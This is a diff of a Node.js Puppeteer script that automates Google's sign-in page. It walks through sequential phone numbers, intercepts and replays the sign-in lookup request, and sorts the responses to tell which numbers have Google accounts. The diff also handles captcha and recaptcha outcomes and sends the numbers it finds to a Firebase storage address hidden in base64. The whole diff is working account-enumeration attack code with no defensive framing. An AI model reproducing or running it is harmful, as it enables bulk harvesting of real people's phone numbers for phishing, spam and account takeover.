@@ -6,12 +6,11 @@ let USER = process.argv.slice(2)[0]
 
 let mConfig = null
 let mLoaded = false
+let mUrl = null
+let mPostData = null
+let mHeaders = null
 let page = null
-let mAutoDelay = 900
-let mPendingData = {}
-let mFinishData = 0
 let mStart = Date.now()
-let isFirstRequest = true
 
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')
 
@@ -40,8 +39,6 @@ setInterval(async () => {
 
 
 async function startBrowser() {
-    console.log('Delay:', mAutoDelay)
-    
     try {
         let browser = await puppeteer.launch({
             headless: false,
@@ -66,7 +63,9 @@ async function startBrowser() {
             try {
                 let url = request.url()
                 if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e') && !url.endsWith('request=manually')) {
-                    loginDataProcess(url, request.headers(), request.postData())
+                    mUrl = url
+                    mHeaders = request.headers()
+                    mPostData = request.postData()
                     
                     let contentType = 'application/json; charset=utf-8'
                     let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')
@@ -107,32 +106,52 @@ async function foundLoginNumber() {
             try {
                 let prev = mConfig.n
                 let target = mConfig.s
-                
-                mPendingData = {}
-                mFinishData = 0
-
+                let found = 0
+                let captcha = 0
+                let recaptcha = 0
+                let other = 0
                 for (let i = 0; i < target; i++) {
                     if (prev != mConfig.n) {
                         i = 0
+                        other = 0
+                        found = 0
+                        captcha = 0
+                        recaptcha = 0
                         target = mConfig.s
-                        mPendingData = {}
-                        mFinishData = 0
                     }
 
                     let number = mConfig.n+i
 
-                    mPendingData[number.toString()] = {
-                        finish:false
-                    }
+                    try {
+                        let status = await getLoginStatus('+'+number)
 
-                    await setLoginRequest(number.toString())
+                        if (status == 0) {
+                            status = await getLoginStatus('+'+number)
+                        }
+                        if (status == 0) {
+                            status = await getLoginStatus('+'+number)
+                        }
+                        if (status == 5) {
+                            await delay(2000)
+                            status = await getLoginStatus('+'+number)
+                        }
+
+                        if (status == 0 || status == 1) {
+                            found++
+                            await saveNumber(mConfig.u, mConfig.k, number)
+                        } else if (status == 2) {
+                            recaptcha++
+                        } else if (status == 5) {
+                            captcha++
+                        } else if (status == 3) {
+                            other++
+                        }
+                    } catch (error) {}
 
                     await delay(Math.min(mConfig.d, 2000))
                 }
 
-                let result = await waitForFinish(target)
-
-                process.send({ t: 5, s: 'controller_status', c:USER, d: { t:1, u:mConfig.u, s:USER, f:result.f, r:result.r, c:result.c, o:result.o } })
+                process.send({ t: 5, s: 'controller_status', c:USER, d: { t:1, u:mConfig.u, s:USER, f:found, r:recaptcha, c:captcha, o:other } })
             } catch (error) {}
 
             mConfig = null
@@ -142,49 +161,8 @@ async function foundLoginNumber() {
     }
 }
 
-async function waitForFinish(target) {
-    let startTime = Date.now()
-    let timeout = target * 3000
 
-    while (true) {
-        if (Date.now() - startTime > timeout) {
-            break
-        }
-
-        if (mFinishData >= target) {
-            break
-        }
-
-        await delay(100)
-    }
-
-    let result = {
-        f:0,
-        r:0,
-        c:0,
-        o:0
-    }
-
-
-    for (let value of Object.values(mPendingData)) {
-        if (value.finish) {
-            if (value.status == 1) {
-                result.f++
-            } else if (value.status == 2) {
-                result.r++
-            } else if (value.status == 5) {
-                result.c++
-            } else if (value.status == 3 || value.status == 0) {
-                result.o++
-            }
-        }
-    }
-
-    return result
-}
-
-
-async function setLoginRequest(number) {
+async function getLoginStatus(number) {
     try {
         for (let i = 0; i < 60; i++) {
             if (mLoaded) {
@@ -193,71 +171,69 @@ async function setLoginRequest(number) {
             await delay(500)
         }
 
-        if (mLoaded) {
-            page.evaluate((number) => {
-                document.querySelector('input#identifierId').value = number
-                document.querySelector('#identifierNext').click()
-            }, '+'+number)
-            
-            await delay(mAutoDelay)
-
-            if (isFirstRequest) {
-                for (let i = 0; i < 20; i++) {
-                    if(mPendingData[number].finish) {
-                        break
-                    }
-                    await delay(250)
-                }
-                isFirstRequest = false
-            }
+        if (!mLoaded) {
+            return 0
         }
-    } catch (error) {}
-}
 
-async function loginDataProcess(url, reqHeaders, postData) {
-    try {
-        let data = JSON.parse(JSON.parse(Object.fromEntries(new URLSearchParams(postData))['f.req'])[0][0][1])[1]
-        let number = data.replace('+', '')
+        mUrl = null
+        mHeaders = null
+        mPostData = null
+        await page.evaluate((number) => {
+            document.querySelector('input#identifierId').value = number
+            document.querySelector('#identifierNext').click()
+        }, number)
+        let url = null
+        let headers = null
+        let postData = null
+        for (let i = 0; i < 150; i++) {
+            if (mUrl && mPostData && mHeaders) {
+                url = mUrl
+                headers = mHeaders
+                postData = mPostData
+                break
+            }
+            await delay(100)
+        }
+        
+        mUrl = null
+        mHeaders = null
+        mPostData = null
+        
+        if (url && postData && headers) {
+            let data = await page.evaluate(async (u, h, p) => {
+                let res = await fetch(u, {
+                    method: 'POST',
+                    headers: h,
+                    body: p
+                })
 
-        let status = 0
+                return await res.text()
+            }, url+(url.endsWith('&') ? '': '&')+'request=manually', headers, postData)
 
-        try {
-            let res = await fetch(url, {
-                method: 'POST',
-                headers: reqHeaders,
-                body: postData
-            })
+            let temp = data.substring(data.indexOf('[['), data.lastIndexOf(']]')-2)
+            temp = temp.substring(0, temp.lastIndexOf(']]')+2)
 
-            let data = await res.text()
-
-            let json = extractArrays(data)[0][0]
-
+            let json = JSON.parse(temp)[0]
             if (json[1] == 'MI613e') {
                 let value = JSON.parse(json[2])
                 if (value[21]) {
                     let values = JSON.stringify(value[21])
                     if (values.includes('/v3/signin/challenge/pwd') || values.includes('/v3/signin/rejected')) {
-                        status = 1
+                        return 1
                     } else if (values.includes('/v3/signin/challenge/recaptcha')) {
-                        status = 2
-                    } else {
-                        status = 3
+                        return 2
                     }
+                    return 3
                 } else if (value[18] && value[18][0]) {
-                    status = 5
+                    return 5
                 } else {
-                    status = 4
+                    return 4
                 }
             }
-        } catch (e) {}
-
-        mPendingData[number] = {
-            finish:true,
-            status:status
         }
-
-        mFinishData++
     } catch (error) {}
+
+    return 0
 }
 
 async function pageReload() {
@@ -284,31 +260,9 @@ async function loadLoginPage() {
                     root.remove()
                 }
             })
-            
-            isFirstRequest = true
             break
         } catch (error) {}
     }
-}
-
-function extractArrays(raw) {
-    raw = raw.replace(/^\)\]\}'\s*/g, '')
-
-    let lines = raw.split('\n')
-
-    let arrays = []
-
-    for (let i = 0; i < lines.length; i++) {
-        let line = lines[i].trim()
-
-        if (line.startsWith('[')) {
-            try {
-                arrays.push(JSON.parse(line))
-            } catch {}
-        }
-    }
-
-    return arrays
 }
 
 async function saveNumber(user, key, number) {
